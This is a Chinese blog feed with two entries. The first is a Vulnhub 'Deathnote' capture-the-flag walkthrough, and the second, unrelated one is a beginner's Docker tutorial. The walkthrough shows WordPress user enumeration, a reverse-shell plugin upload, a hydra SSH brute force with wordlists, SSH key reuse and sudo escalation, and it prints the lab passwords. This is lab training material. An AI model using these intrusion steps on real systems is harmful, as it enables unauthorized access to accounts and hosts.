<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i am Soichiro Yagami, light&#x27;s father</span><br><span class="line">i have a doubt if L is true about the assumption that light is kira</span><br><span class="line"></span><br><span class="line">i can only help you by giving something important</span><br><span class="line"></span><br><span class="line">login username : user.txt</span><br><span class="line">i don&#x27;t know the password.</span><br><span class="line">find it by yourself </span><br><span class="line">but i think it is in the hint section of site</span><br></pre></td></tr></table></figure>
<p>给了我们一个文件名：user.txt，还有一个关于密码的提示。</p>
<p>路径扫描结果如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520151025.png" /></p>
<p>根据提示，找到了 hint</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520151951.png" /></p>
<p>L的评论为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">my fav line is iamjustic3</span><br></pre></td></tr></table></figure></p>
<p>利用 wpscan 扫描 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://deathnote.vuln/wordpress --enumerate u</span><br></pre></td></tr></table></figure></p>
<p>得到一个用户名：kira。根据上面的信息，密码有可能是 world!!! 和
iamjustic3 或者一整句话，都尝试一下。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520153428.png" /></p>
<p>登录成功！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520153441.png" /></p>
<h2 id="后台信息">2.3. 后台信息</h2>
<p>首先在 media 中找到了 note.txt</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520153751.png" /></p>
<p>点击，然后在新页面点击右边的 Copy URL to clipboard
用浏览器直接访问，得到如下信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">death4</span><br><span class="line">death4life</span><br><span class="line">death4u</span><br><span class="line">death4ever</span><br><span class="line">death4all</span><br><span class="line">death420</span><br><span class="line">death45</span><br><span class="line">death4love</span><br><span class="line">death49</span><br><span class="line">death48</span><br><span class="line">death456</span><br><span class="line">death4014</span><br><span class="line">1death4u</span><br><span class="line">yaydeath44</span><br><span class="line">thedeath4u2</span><br><span class="line">thedeath4u</span><br><span class="line">stickdeath420</span><br><span class="line">reddeath44</span><br><span class="line">megadeath44</span><br><span class="line">megadeath4</span><br><span class="line">killdeath405</span><br><span class="line">hot2death4sho</span><br><span class="line">death4south</span><br><span class="line">death4now</span><br><span class="line">death4l0ve</span><br><span class="line">death4free</span><br><span class="line">death4elmo</span><br><span class="line">death4blood</span><br><span class="line">death499Eyes301</span><br><span class="line">death498</span><br><span class="line">death4859</span><br><span class="line">death47</span><br><span class="line">death4545</span><br><span class="line">death445</span><br><span class="line">death444</span><br><span class="line">death4387n</span><br><span class="line">death4332387</span><br><span class="line">death42521439</span><br><span class="line">death42</span><br><span class="line">death4138</span><br><span class="line">death411</span><br><span class="line">death405</span><br><span class="line">death4me</span><br></pre></td></tr></table></figure></p>
<p>最开始在 Media 里面上传文件，结果不允许，应该是做了某些过滤，不过
Plugins 中可以修改 php 还可以自定义插件，这里get
shell的可能性比较大。</p>
<h1 id="get-shell">3. get shell</h1>
<p>首先在kali上获得一个反弹shell的php文件，然后压缩为 zip
格式，上传并安装</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520155224.png" /></p>
<p>然后激活</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520155243.png" /></p>
<p>最后来到 Plugins -&gt; Installed Plugins
下面，把未激活的激活（这里名字插件名字可能大家都不一样，因为我根据第一个插件的注释信息修改了上传的php文件，所以名字和第一个是一样的）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520155338.png" /></p>
<hr />
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520155433.png" /></p>
<p>可以自己随意修改</p>
<hr />
<p>kali在监听状态下成功反弹shell</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520155512.png" /></p>
<h1 id="权限提升">4. 权限提升</h1>
<h2 id="l-权限">4.1. l 权限</h2>
<p>首先，我想先找到 user.txt <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -name &quot;user.txt&quot; 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p>结果找到两个： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/home/l/user.txt</span><br><span class="line">/var/www/deathnote.vuln/wordpress/wp-content/uploads/2021/07/user.txt</span><br></pre></td></tr></table></figure></p>
<p>第一个文件的内容为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++.&lt;&lt;++.&gt;&gt;+++++++++++.------------.+.+++++.---.&lt;&lt;.&gt;&gt;++++++++++.&lt;&lt;.&gt;&gt;--------------.++++++++.+++++.&lt;&lt;.&gt;&gt;.------------.---.&lt;&lt;.&gt;&gt;++++++++++++++.-----------.---.+++++++..&lt;&lt;.++++++++++++.------------.&gt;&gt;----------.+++++++++++++++++++.-.&lt;&lt;.&gt;&gt;+++++.----------.++++++.&lt;&lt;.&gt;&gt;++.--------.-.++++++.&lt;&lt;.&gt;&gt;------------------.+++.&lt;&lt;.&gt;&gt;----.+.++++++++++.-------.&lt;&lt;.&gt;&gt;+++++++++++++++.-----.&lt;&lt;.&gt;&gt;----.--.+++..&lt;&lt;.&gt;&gt;+.--------.&lt;&lt;.+++++++++++++.&gt;&gt;++++++.--.+++++++++.-----------------.</span><br></pre></td></tr></table></figure></p>
<p>这是一段 brainfuck 的代码，将其解密为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i think u got the shell , but you wont be able to kill me -kira</span><br></pre></td></tr></table></figure></p>
<p>这估计是一个flag。</p>
<p>第二个文件的内容为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">KIRA</span><br><span class="line">L</span><br><span class="line">ryuk</span><br><span class="line">rem</span><br><span class="line">misa</span><br><span class="line">siochira </span><br><span class="line">light</span><br><span class="line">takada</span><br><span class="line">near</span><br><span class="line">mello</span><br><span class="line">l</span><br><span class="line">kira</span><br><span class="line">RYUK</span><br><span class="line">REM</span><br><span class="line">SIOCHIRA</span><br><span class="line">LIGHT</span><br><span class="line">NEAR</span><br></pre></td></tr></table></figure></p>
<p>接下来可以利用user.txt和notes.txt内容进行爆破（其实根据 /etc/passwd
中的内容，也可以只针对 l 和 kira 进行爆破） <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P notes.txt 10.0.2.53 ssh</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520160646.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">l:death4me</span><br></pre></td></tr></table></figure>
<p>ssh连接</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520160724.png" /></p>
<h2 id="kira-权限">4.2. kira 权限</h2>
<p>首先在 l 的家目录的 .ssh 中发现了公私钥，还有一个
known_hosts，<strong>这是第一次用密钥登录其他主机/用户的时候才会生成的文件</strong>。因此查看
kira 下面是否也有，结果在 kira 家目录中的 .ssh 目录下发现了
authorized_keys，内容为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDyiW87OWKrV0KW13eKWJir58hT8IbC6Z61SZNh4Yzm9XlfTcCytDH56uhDOqtMR6jVzs9qCSXGQFLhc6IMPF69YMiK9yTU5ahT8LmfO0ObqSfSAGHaS0i5A73pxlqUTHHrzhB3/Jy93n0NfPqOX7HGkLBasYR0v/IreR74iiBI0JseDxyrZCLcl6h9V0WiU0mjbPNBGOffz41CJN78y2YXBuUliOAj/6vBi+wMyFF3jQhP4Su72ssLH1n/E2HBimD0F75mi6LE9SNuI6NivbJUWZFrfbQhN2FSsIHnuoLIJQfuFZsQtJsBQ9d3yvTD2k/POyhURC6MW0V/aQICFZ6z l@deathnote</span><br></pre></td></tr></table></figure></p>
<p>注意最后 l@deathnote 说明这是 l 的公钥，因此直接使用 ssh 密钥获得
kira 权限。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520161328.png" /></p>
<h2 id="root-权限">4.3. root 权限</h2>
<p>读取 kira 家目录下的 kira.txt <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp</span><br></pre></td></tr></table></figure></p>
<p>将其base64解码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">please protect one of the following </span><br><span class="line">1. L (/opt)</span><br><span class="line">2. Misa (/var)</span><br></pre></td></tr></table></figure></p>
<p>首先去了 /opr/L/fake-notebook-rule 发现两个文件：case.wav 和
hint，内容分别为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">case.wav: </span><br><span class="line">63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d</span><br><span class="line">hint:</span><br><span class="line">use cyberchef</span><br></pre></td></tr></table></figure></p>
<p>将其解码</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520162243.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">passwd : kiraisevil</span><br></pre></td></tr></table></figure>
<p>可能是 kira 的密码。</p>
<p>查看 /opt/L/kira-case 目录，只有一个文件： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">the FBI agent died on December 27, 2006</span><br><span class="line"></span><br><span class="line">1 week after the investigation of the task-force member/head.</span><br><span class="line">aka.....</span><br><span class="line">Soichiro Yagami&#x27;s family .</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hmmmmmmmmm......</span><br><span class="line">and according to watari ,</span><br><span class="line">he died as other died after Kira targeted them .</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">and we also found something in </span><br><span class="line">fake-notebook-rule folder .</span><br></pre></td></tr></table></figure></p>
<p>提示我们去之前看的那个目录。</p>
<p>然后又去查看了 /var/misa，内容为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">it is toooo late for misa</span><br></pre></td></tr></table></figure></p>
<p>到头来就获得了一个密码，应该是 kira 的。输入 sudo -l 试一下</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520162625.png" /></p>
<p>确实是 kira 的密码。并且kira具有所有权限，那么直接输入下面命令提权：
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520162710.png" /></p>
<p>读取root下的flag：/root/root.txt <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">      ::::::::       ::::::::       ::::    :::       ::::::::       :::::::::           :::    :::::::::::       :::::::: </span><br><span class="line">    :+:    :+:     :+:    :+:      :+:+:   :+:      :+:    :+:      :+:    :+:        :+: :+:      :+:          :+:    :+: </span><br><span class="line">   +:+            +:+    +:+      :+:+:+  +:+      +:+             +:+    +:+       +:+   +:+     +:+          +:+         </span><br><span class="line">  +#+            +#+    +:+      +#+ +:+ +#+      :#:             +#++:++#:       +#++:++#++:    +#+          +#++:++#++   </span><br><span class="line"> +#+            +#+    +#+      +#+  +#+#+#      +#+   +#+#      +#+    +#+      +#+     +#+    +#+                 +#+    </span><br><span class="line">#+#    #+#     #+#    #+#      #+#   #+#+#      #+#    #+#      #+#    #+#      #+#     #+#    #+#          #+#    #+#     </span><br><span class="line">########       ########       ###    ####       ########       ###    ###      ###     ###    ###           ########       </span><br><span class="line"></span><br><span class="line">##########follow me on twitter###########3</span><br><span class="line">and share this screen shot and tag @KDSAMF</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">5. 总结</h1>
<p>该靶机较简单，涉及的攻击方法有：</p>
<ol type="1">
<li>后台get shell</li>
<li>ssh密钥登录</li>
<li>brainfuck编码</li>
<li>sudo提权</li>
</ol>
]]></content>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>sudo提权</tag>
        <tag>wordpress后台get shell</tag>
        <tag>ssh密钥登录</tag>
        <tag>brainfuck编码</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker入门</title>
    <url>/2023/03/31/Docker%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>教程：</p>
<ol type="1">
<li><a
href="https://www.bilibili.com/video/BV1og4y1q7M4/?spm_id_from=333.337.search-card.all.click&amp;vd_source=c3b0b6208defe5707a75f328be65ce16">【狂神说Java】Docker最新超详细版教程通俗易懂_哔哩哔哩_bilibili</a></li>
<li><a href="https://yeasy.gitbook.io/docker_practice/">前言 - Docker —
从入门到实践</a></li>
<li><a
href="https://www.bilibili.com/video/BV1kv411q7Qc/?vd_source=c3b0b6208defe5707a75f328be65ce16">【狂神说Java】Docker进阶篇超详细版教程通俗易懂_哔哩哔哩_bilibili</a></li>
</ol>
<span id="more"></span>
<h1 id="大纲">1. 大纲</h1>
<ol type="1">
<li>Docker 概述；</li>
<li>Docker 安装；</li>
<li>Docker 命令；
<ol type="1">
<li>镜像</li>
<li>容器</li>
<li>操作</li>
<li>......</li>
</ol></li>
<li>Docker 镜像；</li>
<li>容器数据卷；</li>
<li>DockerFile；</li>
<li>Docker 网络原理；（至少到这）</li>
<li>IDEA 整合 Docker；</li>
<li>Docker Compose；</li>
<li>Docker Swarm；</li>
<li>CI/CD Jenkins</li>
</ol>
<h1 id="概述">2. 概述</h1>
<h2 id="docker-的出现">2.1. Docker 的出现</h2>
<p>其一，有些程序/项目可能在 A 的电脑上可以运行，而在 B
电脑上就不能运行，这并不是代码的问题，可能是环境的问题。再者，有些程序是非跨平台的，开发人员在
Windows 上开发，但用户可能是
Linux，这就导致开发出来的应用在开发人员的电脑上没有问题，而一旦上线就可能存在问题。最后，配置环境太折磨了。</p>
<p>以安卓为例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">开发apk -&gt; 上传应用商店 -&gt; 用户下载、安装</span><br></pre></td></tr></table></figure>
<p>提出了 docker 的使用流程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">开发项目 -&gt; （项目 + 环境）整体打包成镜像（容器） -&gt; 上传docker仓库 -&gt; 用户下载、运行</span><br></pre></td></tr></table></figure>
<p>用户下载的镜像里面包含了开发时的环境，用户启动项目时，该项目也是在开发的环境里面，因此不会产生问题。一个
Docker 可以运行多个容器，每个容器都是环境+项目，并且互相隔离。</p>
<h2 id="虚拟化技术">2.2. 虚拟化技术</h2>
<p>容器技术和虚拟机技术对比：</p>
<ol type="1">
<li>虚拟机与 Docker（容器）都属于虚拟化技术；</li>
<li>虚拟机技术：通过虚拟机软件（比如
VMWare）模拟出完整的电脑，包括硬件，因此，占内存很大，如果只是用虚拟机学习，那么大部分内存都被浪费了；</li>
<li>容器技术：通过软件模拟出
<code>最核心的环境和相关的项目</code>，只要环境能够支持项目的运行就可以了，因此占内存很小；</li>
</ol>
<p>两者对比：</p>
<table>
<colgroup>
<col style="width: 9%" />
<col style="width: 38%" />
<col style="width: 38%" />
<col style="width: 12%" />
</colgroup>
<thead>
<tr class="header">
<th></th>
<th>镜像</th>
<th>内存</th>
<th>启动时间</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Docker</td>
<td>核心环境+项目</td>
<td>M 甚至是 KB 级别</td>
<td>秒级</td>
</tr>
<tr class="even">
<td>虚拟机</td>
<td>原生镜像，是一台完整电脑</td>
<td>每台虚拟机最少占用几个 G</td>
<td>分钟级别</td>
</tr>
</tbody>
</table>
<p>下图是一个完整的电脑：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331112741.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>虚拟机技术模拟出来的场景：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331112939.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>Docker 技术模拟出来的场景：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331113147.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>容器使用的是物理机（宿主机）的内核，不会去模拟，并且 Lib
也不是全部都有，而只包含项目使用到的部分。</p>
<h2 id="相关网站">2.3. 相关网站</h2>
<p>需要知道的几个网站：</p>
<ol type="1">
<li>官网：<a href="https://www.docker.com/">Docker: Accelerated,
Containerized Application Development</a></li>
<li>官方文档：<a href="https://docs.docker.com/">Docker Docs: How to
build, share, and run applications</a></li>
<li>Docker hub（类似于 github，或者理解为应用商店）：<a
href="https://hub.docker.com/">Docker</a></li>
</ol>
<h1 id="安装">3. 安装</h1>
<h2 id="docker-基本组成">3.1. Docker 基本组成</h2>
<p>参考：<a
href="https://www.cnblogs.com/mrhelloworld/p/docker2.html">Docker
架构及工作原理 - 哈喽沃德先生 - 博客园</a></p>
<p>Docker 架构图：</p>
<p>[[Docker入门_基本组成.jpg]]</p>
<p>Client（客户端）：</p>
<ol type="1">
<li><code>docker build</code>：构建（搭建）一个容器；</li>
<li><code>docker pull</code>：拉取一个容器（类似 <code>git</code> 的
<code>pull</code>）；</li>
<li><code>docker run</code>：运行容器，先构建在运行；</li>
</ol>
<p>Docker_HOST（服务器）：</p>
<ol type="1">
<li>Docker daemon：守护进程；</li>
<li>Image：镜像，一个镜像可以 run 出多个容器，比如一个 Tomcat 镜像，可以
run 出多个容器 Tomcat 1、Tomcat 2、Tomcat 3等；</li>
<li>Containers：容器，镜像 run 之后的结果，项目是在容器中运行的；</li>
</ol>
<p>Registry（仓库）：</p>
<ol type="1">
<li>官方的就是 Docker Hub；</li>
<li>还有其他的，比如阿里、百度都有自己的仓库；</li>
<li>仓库的作用就是用来发布镜像，用户可以从仓库拉取自己想要的镜像；</li>
</ol>
<blockquote>
<p>简单理解：用户从应用商店（仓库）下载想要的安装包（镜像），然后在自己的机器上安装成应用程序（容器）。不同的是，一个镜像可以
run
出多个相同的的容器，这些容器相互隔离，而一个安装包只能安装一个应用程序。</p>
</blockquote>
<h2 id="安装步骤">3.2. 安装步骤</h2>
<p>环境：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ cat /etc/os-release </span><br><span class="line">PRETTY_NAME=<span class="string">&quot;Kali GNU/Linux Rolling&quot;</span></span><br><span class="line">NAME=<span class="string">&quot;Kali GNU/Linux&quot;</span></span><br><span class="line">VERSION=<span class="string">&quot;2023.1&quot;</span></span><br><span class="line">VERSION_ID=<span class="string">&quot;2023.1&quot;</span></span><br><span class="line">VERSION_CODENAME=<span class="string">&quot;kali-rolling&quot;</span></span><br><span class="line">ID=kali</span><br><span class="line">ID_LIKE=debian</span><br><span class="line">HOME_URL=<span class="string">&quot;https://www.kali.org/&quot;</span></span><br><span class="line">SUPPORT_URL=<span class="string">&quot;https://forums.kali.org/&quot;</span></span><br><span class="line">BUG_REPORT_URL=<span class="string">&quot;https://bugs.kali.org/&quot;</span></span><br><span class="line">ANSI_COLOR=<span class="string">&quot;1;31&quot;</span></span><br></pre></td></tr></table></figure>
<p>安装文档：</p>
<ol type="1">
<li>Docker 官方：<a
href="https://docs.docker.com/desktop/install/linux-install/">Install
Docker Desktop on Linux</a></li>
<li>Kali 官方：<a
href="https://www.kali.org/docs/containers/installing-docker-on-kali/">Installing
Docker on Kali Linux | Kali Linux Documentation</a></li>
</ol>
<blockquote>
<p>官方文档中的 Linux 教程只有：Ubuntu、Fedora、Debian、Arch</p>
</blockquote>
<blockquote>
<p>在安装前，建议 <code>apt update &amp;&amp; apt upgrade</code></p>
</blockquote>
<p>第一步，安装与启动 <code>docker</code>。注意 Linux 下已经有一个包叫做
<code>docker</code>，如果安装 <code>docker</code> 将不会得到 docker
软件，而是得到另一个软件，所以安装 <code>docker.io</code>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install -y docker.io</span><br></pre></td></tr></table></figure>
<p>安装成功后可以使用命令 <code>docker version</code> 查看</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331120925.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>第二步，添加更新源，kali
或者官网写的都是外网地址，比较慢，我这里使用阿里云。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">2. <span class="built_in">echo</span> <span class="string">&#x27;deb https://mirrors.aliyun.com/docker-ce/linux/debian/ bullseye stable&#x27;</span> | sudo tee /etc/apt/sources.list.d/docker.list</span><br></pre></td></tr></table></figure>
<p>需要注意这里的 <code>bullseye</code> 是 debian
最新的稳定版的名字，根据自己的环境来修改，这里是 kali，而 kali 是基于
Debian 的。</p>
<p>第三步，添加 GPG 密钥，与上面的源相一致就好</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/debian/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure>
<p>第四步，安装 <code>docker-ce</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. sudo apt update</span><br><span class="line">2. sudo apt install -y docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>
<p>第五步，启动 <code>docker</code> 并验证是否安装成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. service docker start</span><br><span class="line">2. sudo docker run hello-world</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331132519.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>原先机器内是没有 <code>hello-world</code> 镜像的，<code>docker</code>
帮助去拉取 <code>pulling from library/hello-world</code>，最后
run，显示消息 <code>Hello from Docker!</code>。</p>
<p>到这为止 <code>docker</code> 安装完成。<code>docker</code>
的工作目录在 <code>/var/lib/docker</code>。</p>
<h2 id="镜像加速">3.3. 镜像加速</h2>
<p>上面的源只是更新、下载 docker
时从哪个仓库下载，而接下来是拉取容器时从哪里拉取，默认的 docker hub
在外网，速度比较慢，因此配置一下镜像加速，选用阿里云的 “镜像加速器”
服务。</p>
<p>文档：<a
href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors">阿里云登录页</a></p>
<p>步骤：</p>
<ol type="1">
<li>登录阿里云，找到镜像加速器服务，获取自己的加速器地址；</li>
<li>创建文件 <code>/etc/docker/daemon.json</code>；</li>
<li>加入如下内容：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;registry-mirrors&quot;: [&quot;加速器地址&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="4" type="1">
<li>输入如下两条命令：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
<h2 id="run-运行流程">3.4. Run 运行流程</h2>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331152909.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h2 id="底层原理">3.5. 底层原理</h2>
<h3 id="docker-是如何工作的">3.5.1. Docker 是如何工作的？</h3>
<p>Docker 是 C/S （Client/Server）结构，Docker
的守护进程运行在宿主机上，用户通过 socker 从客户端访问。</p>
<p>Docker-server 接收 docker-client
的指令后，就会执行该指令，如下图：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331154333.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>上图中两个容器分别开启了 3306 和 80
端口，其他物理机是无法访问容器的这两个端口的，宿主机的 3306 和 80
端口与容器的这两个端口内容不同，宿主机想要访问容器是可以实现的，后面会说。</p>
<h3 id="docker-与-vm-对比">3.5.2. Docker 与 VM 对比</h3>
<p>来源参考：<a
href="https://carlos9310.github.io/2018/03/01/docker-and-vm/">虚拟化技术-Docker
VS Virtual Machines — carlos9310</a></p>
<p>[[docker入门_dockerVSvm.png]]</p>
<p>传统的虚拟机首先通过 <strong>Hypervisor 层</strong>
对物理硬件进行虚拟化，然后在虚拟的硬件资源上安装 <strong>从操作系统
(guest os)</strong>，最后将相关 <strong>应用</strong>
运行在从操作系统上。<strong>其中 APP+BINS/LIBS+Guest OS 为虚拟机
</strong></p>
<p>而 docker 不像虚拟机那样利用 Hypervisor 和 guest os
实现资源与环境的隔离，其仅通过一个 docker daemon/engine 来实现
<strong>资源限制与环境隔离 (终极目标是 app 的隔离)</strong> (主要利用
linux 内核本身支持的容器方式来实现这一功能)，其中 <strong>APP+BINS/LIBS
为容器 (container)</strong>。 <strong>docker daemon/engine
可以简单看成对 Linux 内核中的
NameSpace、Cgroup、镜像管理文件系统操作的封装。</strong>
简单的说，docker 利用 namespace 实现
<strong>系统环境的隔离</strong>；利用 Cgroup 实现
<strong>资源限制</strong>；利用镜像实现
<strong>根目录环境的隔离</strong> 。</p>
<p>虚拟机</p>
<ol type="1">
<li>物理资源层面的隔离 (隔离的更彻底，对硬件进行虚拟化，app
运行在虚拟的硬件上)；</li>
<li>不同虚拟机间系统独立，笨重(G)，启动慢(min)，运行效率低(低于物理硬件)，一台主机可创建有限的虚拟机，资源利用率低；</li>
</ol>
<p>docker</p>
<ol type="1">
<li>app 层面的隔离 (隔离性较差，app
直接运行在宿主机的内核之上，容器内没有自己的内核，也没进行硬件虚拟化，)；</li>
<li>与宿主机共享系统内核，轻快 (M)，启动快 (s)，运行效率高
(接近物理硬件)，一台主机可创建大量容器，资源利用率高；</li>
<li>相比虚拟机更不安全；</li>
</ol>
<h2 id="联合文件系统">3.6. 联合文件系统</h2>
<p>联合文件系统（UnionFST）是一种分层、轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下
(unite several directories into a single virtual
filesystem)，即，可以把多个目录内容联合挂载到同一目录下，从而形成一个单一的文件系统，这种特性可以让使用者像是使用一个目录一样使用联合文件系统。</p>
<p>联合文件系统是 Docker
镜像的基础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像），可以制作各种具体的应用镜像。另外，不同
Docker
容器就可以共享一些基础的文件系统层，同时再加上自己独有的改动层，大大提高了存储的效率。</p>
<ul>
<li>Docker
可以把镜像做成分层的结构，从而使得镜像的每一层可以被共享。</li>
<li>例如两个业务镜像都是基于 CentOS 7
镜像构建的，那么这两个业务镜像在物理机上只需要存储一次 CentOS 7
这个基础镜像即可，从而节省大量存储空间。</li>
</ul>
<p>联合文件系统只是一个概念，真正实现联合文件系统才是关键，那如何实现呢？其实实现方案有很多，Docker
中最常用的联合文件系统有三种：AUFS、Devicemapper 和 OverlayFS。</p>
<p>这就是为什么后面下载了几个镜像后再次下载镜像时，有些内容显示
[[#^f67cbf|Already exists]]</p>
<h3 id="举个栗子">3.6.1. 举个栗子</h3>
<p>如下的拓扑图，centos、apache 2、nginx、tomcat 都是镜像：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401111054.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>假设我第一次要下载 nginx 镜像，为了能够运行这个镜像，需要把
bootfs、centos 都下载下来。那我现在需要下载 tomcat，而 tomcat 的环境与
nginx 相同，所以下载 tomcat 镜像时就不会下载 centos、bootfs，而是会显示
centos already exists。</p>
<h1 id="常用命令">4. 常用命令</h1>
<p>可以去官方文档查看命令。</p>
<h2 id="帮助命令">4.1. 帮助命令</h2>
<ol type="1">
<li><code>docker version</code> 显示 docker 版本信息；</li>
<li><code>docker info</code> 显示 docker
的系统信息，比如镜像和容器数量；</li>
<li><code>docker [命令] --help</code>
<ol type="1">
<li>如果中间不加命令，单纯的
<code>docker --help</code>，会显示帮助信息，有哪些命令可以用，命令用来干嘛的等等；</li>
<li>如果加了中间命令，比如
<code>docker run --help</code>，就会显示该命令有哪些参数，这些参数的作用是什么；</li>
<li>可以去官方文档找对应的命令的帮助信息，一样的效果；</li>
</ol></li>
</ol>
<h2 id="镜像命令">4.2. 镜像命令</h2>
<h3 id="查看本机镜像">4.2.1. 查看本机镜像</h3>
<p>命令： <code>docker images</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331155816.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ docker images       </span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">hello-world   latest    feb5d9fea6a5   18 months ago   13.3kB</span><br></pre></td></tr></table></figure>
<p>解释：</p>
<ol type="1">
<li><code>REPOSITORY</code>：镜像的仓库源；（镜像在仓库中的名字）</li>
<li><code>TAG</code>：镜像的版本信息；</li>
<li><code>IMAGE ID</code>：镜像的 ID；</li>
